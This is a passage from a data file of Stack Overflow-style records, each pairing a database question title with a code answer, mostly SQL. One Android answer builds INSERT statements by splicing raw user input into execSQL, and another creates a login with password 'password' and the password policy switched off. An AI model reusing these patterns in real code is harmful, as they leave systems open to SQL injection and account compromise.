        SELECT TOP(@NosQues) QM.QuestionID, QM.QuestionDesc, QM.QuestionMarks, QM.Answer1, QM.Answer2, QM.Answer3, QM.Answer4 FROM tblQuestionMaster QM 
            INNER JOIN tblExamMaster EM ON QM.Dept = EM.Dept AND QM.Location = EM.Location AND QM.QuesModule = EM.ExamModule 
                Where EM.ExamCode=@ExamCode AND QM.Category =@Catgry 
                Order by NEWID()

        /*SELECT TOP (@NosQues) QuestionID,QuestionDesc,Answer1,Answer2,Answer3,Answer4,QuestionMarks    from [dbo].[tblQuestionMaster] Where Category=@Catgry AND 
        Order by NEWID() */

        FETCH NEXT FROM CategCursor INTO @Catgry
    END
CLOSE CategCursor
DEALLOCATE CategCursor

SELECT * FROM @tbl
END
"
31086,42090,optimal view including last value,"create view as
    select ServerId, ClientId, time, type
    from (select t.*,
                 row_number() over (partition by ServerId, ClientId order by time desc) as seqnum
          from t
         ) t
    where seqnum = 1
"
19941,51254,SQL SELECT based on joined table,"DECLARE @cols AS NVARCHAR(MAX),
    @query  AS NVARCHAR(MAX)

    select @cols = STUFF((SELECT ',' + QUOTENAME(jobtype) 
                        from yourtable
                        group by jobtype
                        ORDER BY jobtype
                FOR XML PATH(''), TYPE
                ).value('.', 'NVARCHAR(MAX)') 
            ,1,1,'')
    --SELECT @cols
    set @query = 'SELECT  JobID,' + @cols + ' from 
                 (
                    select JobID, jobtype, jobvalue from yourtable
                ) x
                pivot 
                (
                    MAX(jobvalue)
                    for jobtype in (' + @cols + ')
                ) p '

    execute(@query)
"
15336,10152,Generate range of strings,"select 'SN' || lpad(lvl, length('100')+1, '0') from (select level lvl from dual connect by level <= 100);
"
24526,38240,Subquery with the same WHERE clause as query,"SELECT DISTINCT ON (senderName) 
       senderName, received -- add more columns as you please
     , SUM(ts_rank_cd(precompTSVector,constantTSQuery)) 
         FILTER (WHERE precomTSVector @@ constantTSQuery)
         OVER (PARTITION BY senderName) AS score 
FROM   tableA
WHERE  received BETWEEN timeA AND timeB
ORDER  BY senderName, received DESC;
"
31681,30213,SQL ACCESS - Dividing rows by a specific total over time,"Select
  tbl_Elements.[Date],
  tbl_Elements.Element,
  tbl_Elements.[Value] / tbl_Elements_1.[Value]
From
  tbl_Elements
    INNER JOIN
  tbl_Elements tbl_Elements_1
    ON tbl_Elements.Date = tbl_Elements_1.Date
Where
  tbl_Elements.Element <> ""El_Divisor""
  AND tbl_Elements_1.Element = ""El_Divisor""
"
13437,52545,Fundamental confusion in SQL and VBA implementation in Access,"Select T1.*,
       T2.*,
       ([Clock_Speed] + [Snapshot]) as Calc
from Table1 T1
inner join Table2 T2 
     on T1.Hardware_Type=T2.Hardware_Type
"
13227,61699,Which SKUs of Oracle support WM_CONCAT?,"with fake_data as(

select 'I/OLT' NAME , 1 aa from dual
union all
select 'ILT-WEB' NAME,2 from dual
union all
select 'OLT' NAME,3 from dual
union all
select 'QRG' NAME,4 from dual
)
SELECT 
       LISTAGG(NAME, ', ') WITHIN GROUP (ORDER BY name)  name_list
FROM fake_data
;

NAME_LIST                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
--------------------------
I/OLT, ILT-WEB, OLT, QRG  
"
39520,44584,postgresql WITH RECURSIVE query to get category and subcategories,"SELECT    c0.name  AS root_name,
          c1.name  AS down1_name,
          c2.name  AS down2_name,
          c3.name  AS down3_name,
          c4.name  AS down4_name,
          c5.name  AS down5_name
FROM      category c0
LEFT JOIN category c1 ON c1.parentid = c0.id
LEFT JOIN category c2 ON c2.parentid = c1.id
LEFT JOIN category c3 ON c3.parentid = c2.id
LEFT JOIN category c4 ON c4.parentid = c3.id
LEFT JOIN category c5 ON c5.parentid = c4.id
WHERE     c0.parentid IS NULL
ORDER BY  c0.id, c1.id, c2.id, c3.id, c4.id, c5.id
"
23625,21450,a script for accounts that had only deposits and no withdrawals presented in the month of February 2016,"select cb.*
from CuentasBancaria cb
where not exists (select 1
                  from retiros r
                  where cb.CuentaId = r.CuentaId and
                        r.FechaMovimiento >= '2016-02-01' and
                        r.FechaMovimiento < '2016-03-01' 
                 ) and
      exists (select 1
              from depositors d
              where cb.CuentaId = d.CuentaId and
                    d.FechaMovimiento >= '2016-02-01' and
                    d.FechaMovimiento < '2016-03-01' 
             );
"
31492,53742,"Query of three related tables, showing only the latest records for each person, with SQL in MS Access","SELECT c1.[correspondence id],
       r.[registrant id],
       c2.[course id],
       [correspondence date] + [correspondence time] AS expr1
FROM   course c2
       INNER JOIN (registrants r
                   INNER JOIN correspondences c1
                     ON r.[registrant id] = c1.[registrant id])
         ON c2.[course id] = c1.[course id]
WHERE  [correspondence id] IN (SELECT [correspondence id]
                               FROM   correspondences b
                               WHERE  b.[registrant id] = c1.[registrant id]
                                      AND [correspondence date] +
                                          [correspondence time]
                                          =
                                          (SELECT MAX([correspondence date] +
                                                      [correspondence time])
                                           FROM   correspondences
                                           WHERE
                                              [registrant id] =
                                              c1.[registrant id]))
"
15870,35355,Change TFS 2013 database tier name,"tfsconfig.exe remapdbs /DatabaseName:data.tfs.contoso.local;Tfs_Configuration /SQLInstances:data.tfs.contoso.local
"
32430,62602,Update a boolean to its opposite in SQL without using a SELECT,"UPDATE `table` SET `my_bool` = NOT my_bool
"
26217,6355,How to select latest record from return set of records ?,"SELECT TOP 1 *
FROM Table
WHERE CreateDate < '25-Dec-2012' 
ORDER BY CreateDate DESC
"
25159,65312,MYSQL SUM functionality to total rows' 'value' in table groups by a 'key' column,"SELECT `key`, SUM(value) totalValue
FROM table Name
GROUP BY `key`
"
3707,73126,If statement based on other column,";With cte as 
(
select DATEDIFF(day,[Contract Start Date],[Contract End Date]) as contract_time,
a,
b,
c
from table 1
)

select contract_time
       case when contract_time is null then c
            when contract_time >= 390 then a
            when contract_time <  390 then b
       end as otherColumn
from cte
"
29305,23096,selecting all values in GroupBy,"SELECT  ID, [DESC], TerminationDate, LastUpdtDt
FROM
        (
            SELECT  ID, [DESC], TerminationDate, LastUpdtDt,
                    ROW_NUMBER() OVER(PARTITION BY ID 
                    ORDER BY LastUpdtDt DESC) rn
            FROM    TableName
        ) ss
WHERE   rn = 1
"
22676,66544,How to use spinner list in database,"
private String category;
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    dbhelper = new DBhelper(this);
    db = dbhelper.getWritableDatabase();
    tEvent = (EditText) findViewById(R.id.event);
    tLocation = (EditText) findViewById(R.id.venue);
    tAmount = (EditText) findViewById(R.id.amount);

    spin = (Spinner) findViewById(R.id.spinner);

    list.add(""---CATEGORIES---"");
    list.add(""Eating"");
    list.add(""Entertainment"");
    list.add(""Shopping"");
    list.add(""Transportation"");

    adapter = new ArrayAdapter < String > (this, android.R.layout.simple_spinner_item, list);
    adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);

    spin.setAdapter(adapter);
    spin.setOnItemSelectedListener(new OnItemSelectedListener() {
        public void onItemSelected(AdapterView parent, View view, int pos, long id) {
            category = parent.getItemAtPosition(pos).toString();
        }
        public void onNothingSelected(AdapterView parent) {
            category = null;
        }
    });
}

protected void onStop() {
    super.onStop();
    db.close();
}

public void Badd_Click(View view) {
    db.execSQL(""INSERT INTO Demo (event, venue, amount, textView) VALUES ('"" + tEvent.getText().toString() + ""',"" + ""'"" + tLocation.getText().toString() + ""',"" + ""'"" + tAmount.getText().toString() + ""' )"");
    db.execSQL(""INSERT INTO Demo (category) VALUES ('"" + category + ""');""); // ONLY EXAMPLE
    Toast.makeText(this, ""Create record successfully..."", Toast.LENGTH_SHORT).show();
}

public void Btnshow_Click(View view) {
    String str = """";
    Cursor c = db.rawQuery(""SELECT * FROM "" + DATABASE_TABLE, null);
    c.moveToFirst();
    for (int i = 0; i < c.getCount(); i++) {
        str += ""ID: "" + c.getString(0) + ""\n"";
        str += ""Name : "" + c.getString(1) + ""\n"";
        str += ""Location : "" + c.getString(2) + ""\n"";
        str += ""Amount : "" + c.getString(3) + ""\n\n"";
        c.moveToNext();
    }

    Builder MyAlertDialog = new AlertDialog.Builder(this);
    MyAlertDialog.setTitle(""Records"");
    MyAlertDialog.setMessage(str);
    DialogInterface.OnClickListener OkClick = new DialogInterface.OnClickListener() {
        public void onClick(DialogInterface dialog, int which) {}
    };
    MyAlertDialog.setNeutralButton(""OK"", OkClick);
    MyAlertDialog.show();
}
"
38491,40802,Mysql - orderby count of another statement,"select b.name_surname,b.avatar,b.friend_words,b.friend_msg_id, count(m.id) from (
    SELECT a.name_surname as name_surname,
           a.avatar as avatar,
           GROUP_CONCAT(DISTINCT w.word ORDER BY w.word ASC) AS friend_words,
           (a.friend_id) AS friend_msg_id /* Unread msg from id */
    FROM (
      SELECT f1.asked_user_id AS friend_id,
           f1.created,
           u.name_surname,
           u.avatar
      FROM friends AS f1 
      INNER JOIN friends AS f2 ON f1.asked_user_id = f2.asker_user_id
      INNER JOIN users AS u ON f1.asked_user_id = u.id
           AND f1.asker_user_id = f2.asked_user_id
      WHERE f1.status = 1 AND f2.status = 1
           AND f1.asker_user_id = 1 /* Current user id */
    ) a
    LEFT JOIN connections c ON c.user_id = a.friend_id 
    LEFT JOIN words_en w ON c.word_id = w.id
) b
left join messages m on m.to_user_id = 1 
          and m.from_user_id = b.friend_msg_id 
          and m.seen = 0
group by b.name_surname,b.avatar,b.friend_words,b.friend_msg_id
"
36327,25226,Subtition of cursor for combining tables with time periods,"WITH
  old_ranges(d1,d2) AS (
     SELECT ValidFrom,ValidTo FROM @Address UNION
     SELECT ValidFrom,ValidTo FROM @Phone   
  ),
  new_ranges(d1,d2) AS (
    SELECT d,LEAD(d) OVER(ORDER BY d)
    FROM (
      SELECT DISTINCT d
      FROM old_ranges 
      UNPIVOT(d FOR dx IN (d1,d2)) p
    ) t
  )
SELECT
  ROW_NUMBER() OVER (ORDER BY d1) AS ID,
  NewPhone,
  NewAddress,
  d1 AS ValidFrom,
  d2 AS ValidTo
FROM new_ranges
OUTER APPLY (
  SELECT PhoneValue AS NewPhone
  FROM @Phone
  WHERE ValidFrom <= d1 AND ValidTo >= d2
) x1
OUTER APPLY (
  SELECT AddressValue AS NewAddress
  FROM @Address
  WHERE ValidFrom <= d1 AND ValidTo >= d2
) x2
WHERE d2 IS NOT NULL
"
22445,34872,YearFrac in Sql 2005,"create function yearfrac (@d1 datetime, @d2 datetime) returns float
as
begin
return abs(datediff(d, @d1, @d2)) / 365.00
end
"
24727,22908,Detecting cycles in a recursive query,"with recursive ""nodes"" (""node"", ""depth"", ""path"", ""cycle"") as (
  select 10, 0, ARRAY[10], false
union all
  select ""to"", ""depth"" + 1, path || ""to"", ""to"" = ANY(path)
  from ""edges"", ""nodes""
  where ""from"" = ""node"" and not ""cycle""
) select * from (select ""node"", min(""depth""), ""path"", ""cycle""
                from ""nodes"" group by ""node"", ""path"", ""cycle"") as n 
                where not ""cycle"";
"
26415,63564,Get total count of rows in pagination query,"SELECT *
  FROM (SELECT outr.*,
               ROWNUM row_num
          FROM (SELECT emp_no,
                       emp_name,
                       dob,
                       count(*) over () total_nb
                  FROM emp
                 ORDER BY ...) outr
         WHERE ROWNUM < ((pagenum * row_size) + 1))
 WHERE row_num >= (((pagenum - 1) * row_size) + 1)
"
5749,32884,"Best Practice to Grant Access to specific tables, SQL","GRANT select,insert,update,delete ON [MyDB].[dbo].[t1] TO [MyUser] 
GO
GRANT select,insert,update,delete ON [MyDB].[dbo].[t2] TO [MyUser] 
GO
GRANT select,insert,update,delete ON [MyDB].[dbo].[t3] TO [MyUser] 
GO
GRANT select,insert,update,delete ON [MyDB].[dbo].[t4] TO [MyUser] 
"
13966,6282,Create a new db user in SQL Server 2005,"CREATE LOGIN [user] WITH PASSWORD='password', 
       DEFAULT_DATABASE=[your_db], CHECK_POLICY=OFF
GO

CREATE USER [user] FOR LOGIN [user]
EXEC sp_addrolemember N'db_datareader', N'your_db'
EXEC sp_addrolemember N'db_datawriter', N'your_db'
GO
"
11163,53054,Select values with duplicate max values sql,"select
   max(sales),
   max(date_) keep (dense_rank first order by sales desc),
   sum(sales),
   min(date_)
from
   table_
"
21611,54622,TSQL Getting Info From Another Row in the Same Table?,"select o.*, prev.*
from FTPLog o
cross apply 
 (
   select top 1 *
   from FTPLog P where P.LogDate < O.LogDate 
   order by LogDate DESC
 ) prev
"
26922,73491,VB to SQL Power Of Calculation,"select (1.2 / power(10, 7))
"
26893,62990,MySQL SELECT + add a character after value,"SELECT concat(brand, ' w') as brand
FROM `autoinfo` 
WHERE 1;
"
5134,48877,How can I do asynchrous database in JavaFX,"public class FlightControllerTask extends Task<LinkedList<Flight>>{
  @Override
  protected LinkedList<Flight> call() throws Exception { 
    // load data
    return data;
  }
}

// usage:
FlightControllerTask task = new FlightControllerTask();
task.setOnSucceeded(ev -> task.getValue());
new Thread(task).start();
"
26425,8426,Perform INSERT INTO with WITH query,"; with  t1 as 
        (
        ...
        )
,       t2 as 
        (
        ...
        )
insert  @tempTbl
        (col1, col2)
select  col1
,       col2
from    t1
full join
        t2
on      t1.rn = t2.rn
;
"
35769,71477,sqlite foreach in select statement?,"SELECT SUM(step2.area_sum),
       step2.meno
FROM (SELECT SUM(rozloha) * sum(podield_sum) AS area_sum,
             par.idlvfk,
             meno
      FROM parcela par
      JOIN kategorie kat ON par.idkategoriafk = kat.idkategoria
      JOIN (SELECT SUM(podield) AS podield_sum,
                   idlvfk
            FROM majetok
            GROUP BY idlvfk) AS ps ON ps.idlvfk = par.idlvfk
      GROUP BY idlvfk,
               meno) AS step2
GROUP BY step2.meno
"
17398,43729,Exiting prematurelly a FOR from an internal IF,"FOR I IN T_TITLE.FIRST.. T_TABLE.LAST LOOP
  IF T_TABLE(I).VAR_TITLE = PAR_TITLE THEN
    V_TITLE_ID = I;
    EXIT;
  END IF;
END LOOP;
"
26476,37353,How to create a non-SQLEXPRESS instance for SQL Server 2012 developer edition,"SELECT SERVERPROPERTY('EDITION')
"
33831,65464,Concatenate multiple columns from multiple rows in Oracle,"SELECT ID,
   LISTAGG (
      CASE
      WHEN TIPE = 'v' THEN
         C_STRING
      ELSE
         TO_CHAR (C_NUMBER)
      END || OP,
      ' '
   ) WITHIN GROUP (ORDER BY URUT) AS CONCAT_RESULT
FROM KOMPONEN
GROUP BY ID;
"
1905,71001,SQL: Removing rows from Select Statement on Insert,"create table #table1
(
    ID int,
    [Event] varchar(100)
);

go

insert into #table1 values (1, 'A Missing');
insert into #table1 values (1, 'B Missing');
insert into #table1 values (1, 'C Missing');
insert into #table1 values (1, 'A Received');
insert into #table1 values (1, 'B Received');

go

with cte as
(
    select id, [Event], substring([Event], 1, patindex('% %', [Event]) -1) as ItemId
    from #table1
)

select a.Event
from cte a
    left join cte b on 
        a.id = b.id and                 -- IDs must match
        a.ItemId = b.ItemId and         -- the ItemId from the parsed Event must match on the left side
        a.Event like '%Missing' and     -- items that match have a 'Missing' on the ""left""
        b.Event like '%Received'        -- items that match have a 'Received' on the ""right""
where b.ID is null                      -- rows that did not match on the right
and a.Event like '%Missing'             -- row has missing in the event on the left side


drop table #table1;

go
"
13819,17818,Change nullability add primary key in one statement,"ALTER TABLE [ database_name . [ schema_name ] . | schema_name . ] table_name 
{ 
    ALTER COLUMN column_name 
    { 
        ...
    }    
    | ADD 
    { 
        ...
    } [ ,...n ]
"
15834,30850,how to query access to select entire records given a distinct criteria,"SELECT
    c.*
FROM
    Customer  c 
    INNER JOIN 
    (

    SELECT 
        c.promo1,
        MIN(c.AutoID) AutoID
    FROM 
        Customer  c
    GROUP BY
        c.promo1) FirstCusomterWithPromo
    ON c.AutoID = FirstCusomterWithPromo.AutoID
"
31151,33096,Split comma separated values in Oracle 9i," WITH TT AS
 (SELECT orderid COL1 FROM orders)
 SELECT substr(str,
                   instr(str, ',', 1, LEVEL) + 1,
                   instr(str, ',', 1, LEVEL + 1) -
                   instr(str, ',', 1, LEVEL) - 1) COL1
     FROM   (SELECT rownum AS r,
                    ','|| COL1||',' AS STR
               FROM   TT )
     CONNECT BY PRIOR r = r
         AND    instr(str, ',', 1, LEVEL + 1) > 0
         AND    PRIOR dbms_random.STRING('p', 10) IS NOT NULL
;
"
7930,28764,SQL group by month and add 15mins,"SELECT Sum(Value)
FROM MyTable
GROUP BY MONTH(DATEADD(minute,15,myDate)), YEAR(DATEADD(minute,15,myDate))
"
5539,37090,How to divide SQL/MySQL query output into multiple tables?,"Select T1.Total Total1, T1.Program Program1, T2.Total Total2, T2.Program Program2, T1.Status

From
(SELECT  COUNT (*) AS Total, Program, Status
FROM APP_PGM_CHOICE
WHERE Program = 'EX'
AND  APP_PGM_REQ_DT  >= '20150101'
AND APP_PGM_REQ_DT  <= '20150131'
AND Status IN ( 'PE','DN','AP')
GROUP BY  Program, Status
ORDER BY  Program, Status) T1

INNER JOIN

(SELECT  COUNT (*) AS Total, Program, Status
FROM APP_PGM_CHOICE
WHERE Program = 'IM'
AND  APP_PGM_REQ_DT  >= '20150101'
AND APP_PGM_REQ_DT  <= '20150131'
AND Status IN ( 'PE','DN','AP')
GROUP BY  Program, Status
ORDER BY  Program, Status) T2 on T1.Status = T2.Status
"
26403,38023,Embedded Storage Alternatives for NodeJS,"npm install level
"
16326,3461,SQL Distinct comma delimited list,"DECLARE @listStr VARCHAR(MAX) 
SELECT @listStr = COALESCE(@listStr+',' ,'') + name 
FROM (SELECT DISTINCT name FROM Production.Product) t
SELECT @listStr
"
23601,290,cake php how do a good query,"$this->PbFeedback->find('all', array(
    'contain' => array (
        'Usuario',
        'UltimoMensaje ',
        'eon_feedback' => array (
            'fields' => array ('created','msg','tipo'),
            'conditions' => array ('eon_feedback.status =' => '0')
        )
    ),
    'limit' => 30
);
"
16186,34489,SQL Server multiple conditions from table,"SELECT * FROM `table1` t1
LEFT JOIN `table2` t2 ON t1.member_id = t2.member_id
WHERE t2.date BETWEEN t1.date_start AND t1.date_end
"
9902,44270,SQL: Trying to select two meta_values in one query,"SELECT meta_value FROM wp_postmetaWHERE meta_key = ""bid_resource_lat"" OR meta_key = ""bid_resource_lng""
"
28113,22529,Insertable UNION ALL VIEW on SQL Server 2012,"CREATE TRIGGER trigger_delete_all_customers ON [All Customers]
INSTEAD OF DELETE
AS
BEGIN
    DELETE c 
    FROM deleted AS d 
         INNER JOIN Company1_Customers AS c ON
              c.[Customer ID]=d.[Customer ID]
    WHERE
        d.[Company]='Company1';

    DELETE c 
    FROM deleted AS d 
         INNER JOIN Company2_Customers AS c ON
              c.[Customer ID]=d.[Customer ID]
    WHERE
        d.[Company]='Company2';
END
"
9087,2142,SQl select all if table exists,"IF (EXISTS (SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = N'2000064'))
    SELECT * from [2000064]
"
25180,54911,SQL query for book search,"select * from tablename
where PageNo in
    (select PageNo
     from tablename
     where Word in ('A','B')
     group by PageNo
     having count(distinct Word) >= 2)
"
21964,54016,Update or Insert Row depending on whether row is present in Microsoft SQL Server 2005,"SET NOCOUNT ON

IF (OBJECT_ID('tempdb..#TempRanges') IS NULL)
BEGIN
CREATE TABLE #TempRanges(
    [iRangeID] [int] NOT NULL,
    [iSetID] [int] NOT NULL,
    [fRangeFrom] [float] NOT NULL,
    [fRangeTo] [float] NOT NULL,
    [bTakeoutEnabled] [bit] NOT NULL,
 CONSTRAINT [PK_TempRanges] PRIMARY KEY CLUSTERED 
(
    [iRangeID] ASC,
    [iSetID] ASC
)
)
END
ELSE
BEGIN
DELETE FROM #TempRanges
INSERT INTO #TempRanges([iRangeID], [iSetID], [fRangeFrom], [fRangeTo], [bTakeoutEnabled])
SELECT '1', '6', '0', '20', '0' UNION ALL
SELECT '4', '6', '21', '40', '0' UNION ALL
SELECT '5', '6', '999', '60', '0' UNION ALL
SELECT '6', '6', '61', '80', '0' 
END



DECLARE @doc XML

SET @doc = '<Strategy StrategyID=""0"" TOStrategyID=""8"" ShutdownQtySell=""1"" ShutdownQtyBuy=""1"">
      <ParameterRange ParameterSetID=""6"" ParameterRangeID=""1"" ParameterRangeFrom=""0"" ParameterRangeTo=""20"" ParameterAutoTakeOut=""False"">
      </ParameterRange>
      <ParameterRange ParameterSetID=""6"" ParameterRangeID=""4"" ParameterRangeFrom=""21"" ParameterRangeTo=""40"" ParameterAutoTakeOut=""False"">
      </ParameterRange>
      <ParameterRange ParameterSetID=""6"" ParameterRangeID=""5"" ParameterRangeFrom=""41"" ParameterRangeTo=""60"" ParameterAutoTakeOut=""False"">
      </ParameterRange>
      <ParameterRange ParameterSetID=""6"" ParameterRangeID=""6"" ParameterRangeFrom=""61"" ParameterRangeTo=""80"" ParameterAutoTakeOut=""False"">
      </ParameterRange>
      <ParameterRange ParameterSetID=""6"" ParameterRangeID=""7"" ParameterRangeFrom=""81"" ParameterRangeTo=""100"" ParameterAutoTakeOut=""False"">
      </ParameterRange>
</Strategy>'

DECLARE @idoc INT

EXEC sp_xml_preparedocument @idoc OUTPUT, @doc


UPDATE    #TempRanges
SET    fRangeFrom =ParameterRangeFrom, fRangeTo =ParameterRangeTo, bTakeoutEnabled =ParameterAutoTakeOut
FROM OPENXML(@idoc, '/Strategy/ParameterRange', 1)
WITH (ParameterSetID int,ParameterRangeID int,ParameterRangeFrom float,ParameterRangeTo float,ParameterAutoTakeOut bit)  AS input
INNER JOIN #TempRanges ON #TempRanges.iRangeID = input.ParameterRangeID AND #TempRanges.iSetID = input.ParameterSetID

PRINT CONVERT(VARCHAR(10) ,@@ROWCOUNT) + ' Updated'


INSERT INTO #TempRanges
           ([iRangeID]
           ,[iSetID]
           ,[fRangeFrom]
           ,[fRangeTo]
           ,[bTakeoutEnabled])
SELECT ParameterRangeID as iRangeID,  
       ParameterSetID as iSetID,  
       ParameterRangeFrom as fRangeFrom,  
       ParameterRangeTo as fRangeTo,  
       ParameterAutoTakeOut as bTakeoutEnabled  
FROM OPENXML(@idoc, '/Strategy/ParameterRange', 1)
WITH (ParameterSetID int,ParameterRangeID int,ParameterRangeFrom float,ParameterRangeTo float,ParameterAutoTakeOut bit)  AS input
LEFT OUTER JOIN #TempRanges ON #TempRanges.iRangeID = input.ParameterRangeID AND #TempRanges.iSetID = input.ParameterSetID
WHERE #TempRanges.iRangeID IS NULL


PRINT CONVERT(VARCHAR(10) ,@@ROWCOUNT) + ' Inserted'

SELECT * FROM #TempRanges
"
31931,33459,TSQL: Is there a faster or better way to encrypt values?,";WITH cte AS
(
  SELECT HASHBYTES('SHA2_512', N'test') AS [HashedValue]
)
SELECT cte.HashedValue, -- VARBINARY
       CONVERT(VARCHAR(200), cte.HashedValue) AS [DefaultOrStyle0], -- converted
       CONVERT(VARCHAR(200), cte.HashedValue, 1) AS [Style1], -- leading 0x
       CONVERT(VARCHAR(200), cte.HashedValue, 2) AS [Style2] -- no leading 0x
FROM   cte;
"
33641,16844,postgresql case when date and sorting by date,"SELECT
  id,
  COALESCE(CloseDate, ResolvedDate) AS FinalDate
FROM
  cases
WHERE
  (EXTRACT (month FROM COALESCE(CloseDate, ResolvedDate)) = EXTRACT(month FROM current_date)) AND
  (EXTRACT (day from COALESCE(CloseDate, ResolvedDate)) = EXTRACT(day FROM current_date))
"
20196,10208,How to drop this custom type?,"DROP TYPE dbo.changedat;
DROP TYPE dbo.changedby;
GO;
"
16813,12122,Can I have a real time query on SQL Server?,"select *
from LogItems
where ID > @lastSeenID
"
32404,50299,How to calculate sum of the years into a new column for Current to previouse years,"select cs.*,
       sum(cs.ActiveEachYear) over (order by cs.[year]) as TotalActiveInSystem
from CurrentScenario cs
order by cs.[year] desc;
"
17546,9077,dropping duplicate foreign keys,";WITH FKData AS
(
    SELECT  
        fk.parent_object_id,
        fkc.parent_column_id,
        fk.referenced_object_id,
        fkc.referenced_column_id,
        FKCount = COUNT(*)
    FROM 
         sys.foreign_keys fk
    INNER JOIN 
         sys.foreign_key_columns fkc ON fkc.constraint_object_id = fk.object_id
    GROUP BY 
         fk.parent_object_id, fkc.parent_column_id, fk.referenced_object_id, fkc.referenced_column_id
    HAVING 
         COUNT(*) > 1
),
DuplicateFK AS
(
    SELECT  
        FKName = fk.Name,
            ParentSchema = s1.Name,
        ParentTable = t1.Name,
        ParentColumn = c1.Name,
        ReferencedTable = t2.Name,
        ReferencedColumn = c2.Name 
    FROM 
        sys.foreign_keys fk
    INNER JOIN 
        sys.foreign_key_columns fkc ON fkc.constraint_object_id = fk.object_id
    INNER JOIN 
        FKData f ON fk.parent_object_id = f.parent_object_id 
                 AND fk.referenced_object_id = f.referenced_object_id 
                 AND fkc.parent_column_id = f.parent_column_id
                 AND fkc.referenced_column_id = f.referenced_column_id
    INNER JOIN 
        sys.tables t1 ON f.parent_object_id = t1.object_id
    INNER JOIN 
        sys.columns c1 ON f.parent_object_id = c1.object_id AND f.parent_column_id = c1.column_id
INNER JOIN 
    sys.schemas s1 ON t1.schema_id = s1.schema_id   
    INNER JOIN 
        sys.tables t2 ON f.referenced_object_id = t2.object_id
    INNER JOIN 
        sys.columns c2 ON f.referenced_object_id = c2.object_id AND f.referenced_column_id = c2.column_id
)
SELECT
    FKName,
    ParentSchema, ParentTable, ParentColumn, 
    ReferencedTable, ReferencedColumn,
    DropStmt = 'ALTER TABLE ' + ParentSchema + '.' + ParentTable + 
               ' DROP CONSTRAINT ' + FKName
FROM 
    DuplicateFK
"
362,22653,SQL (Oracle) Updating multiple rows with calculated values (distance by Pythagorean theorem),"update customers
    set distance = SQRT(Power(coordinate_x, 2) + Power(coordinate_y, 2)) 
"
16787,54682,select fields from table where id not in another table in mysql [not working],"Select *  
from [Table1] AS T1  
where not exists( select * from [Table2] AS T2 where T1.ID = T2.ID)  
"
22242,71082,"MSSQL Query Help? Should be easy, but I must need more coffee?","SELECT a.*
FROM (SELECT GNUM, Team1
      FROM TABLE1  
      UNION
      SELECT GNUM, Team2
      FROM TABLE1  
      )a
LEFT JOIN TABLE2 b 
  ON a.GNUM = b.GNUM
  AND a.Team1 = b.TeamID
WHERE b.TeamID IS NULL
"
27647,55680,Use of UNION enables more powerful SQL constructions,"SELECT Day, RoomID
FROM (VALUES (1),(2),(3),(4),(5),(6),(7)) as Days(Day) 
CROSS JOIN tblRoom
EXCEPT
SELECT Day, RoomID FROM tblBooking
ORDER BY RoomID, Day
"
38629,63285,select into and if statements,"DECLARE
   num   number;
BEGIN
   SELECT COUNT (*)
     INTO num
     FROM csteinkamp.gai
    WHERE breed_ref_id = 455;

   IF (num > 5)
   THEN
      UPDATE csteinkamp.gai
         SET animal_nm = 'TEST'
       WHERE breed_ref_id = 455;
   ELSE
      DELETE FROM csteinkamp.gai
            WHERE breed_ref_id = 455;
   END IF; -- End if.
END; -- End of the program block.
"
34693,68908,MS Access 2007 SQL: Select First Instance of Date/ID combo when id recurs on multiple dates,"SELECT st.site, st.year, ht3.date, ht3.time, ht3.trappers, ct3.trap_line, ct3.trap_no, ct3.species, ct3.id_type, ct3.[non-tag_id], ct3.id_code, ct3.age, ct3.sex, ct3.repro, ct3.wt_g, ct3.tail_mm, ct3.capcode, ct3.dead, ct3.comments, ct3.errata
FROM [Session Table] AS st INNER JOIN ([Header (Survey) Table] AS ht3 INNER JOIN [Capture Table] AS ct3 ON ht3.survey_id = ct3.survey_id) ON st.session_ID = ht3.session_id
WHERE ct3.id_code IN(
  SELECT ct2.id_code
  FROM [Header (Survey) Table] ht2 INNER JOIN [Capture Table] ct2 ON ht2.survey_id = ct2.survey_id
  WHERE (ct2.capcode = ""2"") AND ct2.capture_id IN
     (SELECT TOP 1 ct.capture_id                          
     FROM [Header (Survey) Table] ht INNER JOIN [Capture Table] ct ON ht.survey_id = ct.survey_id                            
     WHERE ct.id_code = ct2.id_code
     ORDER BY ct.id_code DESC, ht.date ASC, ht.time ASC) 
  ORDER BY ct2.id_code DESC, ht2.date ASC, ht2.time ASC);
"
34724,36997,Oracle 10g - UTL_MAIL package,"SELECT * FROM ALL_SYNONYMS WHERE OWNER = 'PUBLIC' and table_name LIKE 'UTL%'
"
28675,42221,Alert when sql log file become too big?,"USE [msdb]
GO
Declare @AdminUserName varchar(255)
Declare @Operator varchar(255)
Declare @EmailNotify bit
Set @AdminUserName = N'YOUR SYSADMIN USER'
set @Operator = N'YOUR OPERATOR NAME'
Set @EmailNotify = 1


/****** Object:  Job [Transaction Logfile Size Monitoring]    Script Date: 08/02/2012 15:39:11 ******/
BEGIN TRANSACTION
DECLARE @ReturnCode INT
SELECT @ReturnCode = 0
/****** Object:  JobCategory [[Uncategorized (Local)]]]    Script Date: 08/02/2012 15:39:11 ******/
IF NOT EXISTS (SELECT name FROM msdb.dbo.syscategories WHERE name=N'[Uncategorized (Local)]' AND category_class=1)
BEGIN
EXEC @ReturnCode = msdb.dbo.sp_add_category @class=N'JOB', @type=N'LOCAL', @name=N'[Uncategorized (Local)]'
IF (@@ERROR <> 0 OR @ReturnCode <> 0) GOTO QuitWithRollback

END
Declare @NotifyLevel int
If @EmailNotify = 1 Begin 
set @NotifyLevel =2 end 
else begin
set @NotifyLevel=0 
set @Operator=null
end

DECLARE @jobId BINARY(16)
EXEC @ReturnCode =  msdb.dbo.sp_add_job @job_name=N'Transaction Logfile Size Monitoring', 
            @enabled=1, 
            @notify_level_eventlog=0, 
            @notify_level_email=@NotifyLevel, 
            @notify_level_netsend=0, 
            @notify_level_page=0, 
            @delete_level=0, 
            @description=N'No description available.', 
